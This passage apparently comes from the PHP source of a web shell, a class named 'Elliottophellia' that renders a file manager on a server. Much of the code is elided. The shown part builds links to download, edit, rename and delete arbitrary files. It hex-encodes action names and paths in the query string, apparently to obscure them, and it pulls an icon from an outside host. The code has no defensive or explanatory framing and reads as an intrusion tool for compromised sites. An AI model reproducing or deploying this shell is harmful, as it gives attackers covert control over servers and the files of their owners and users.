...
function getFilePermissions(string $file): string
{
    ...
    return sprintf("<span style='color: %s;'>%s</span>", $color, $info);
}
...
function getOwnerGroup(string $item): string
{
    ...
    return sprintf('%s/%s', $owner, $group);
}
...
class Elliottophellia
{
    ...
    private function showFileManager(): void
    {
        ...
        foreach ($regularFiles as $regularFile) {
            $fullPath = $this->currentPath . '/' . $regularFile;
            $actions = "<a href='" . $this->selfFile . '?t=' . stringToHex('download') . '&f=' . stringToHex($regularFile) . '&d=' . stringToHex($this->currentPath) . sprintf("'><i class='fa fa-fw fa-download'></i></a> <a href='%s?t=", $this->selfFile) . stringToHex('fedit') . "&fedit=" . stringToHex($regularFile) . "&d=" . stringToHex($this->currentPath) . "'><i class='fa fa-fw fa-edit'></i></a> <a href='" . $this->selfFile . "?t=" . stringToHex("cname") . "&oldname=" . stringToHex($regularFile) . "&d=" . stringToHex($this->currentPath) . sprintf("'><i class='fa fa-fw fa-pencil'></i></a> <a href='%s?rfile=", $this->selfFile) . stringToHex($regularFile) . "&d=" . stringToHex($this->currentPath) . "'><i class='fa fa-fw fa-trash'></i></a>";

            echo "<tr>
            <td><img src='//rei.my.id/file.png' /> <a href='{$this->selfFile}?t=" . stringToHex('fview') . "&f=" . stringToHex($regularFile) . "&d=" . stringToHex($this->currentPath) . "'>{$regularFile}</a></td>
            <td>{$actions}</td>
...
try {
    ...
    $errorMessage = 'Caught exception: ' . $throwable->getMessage() . "\n" . $throwable->getTraceAsString();
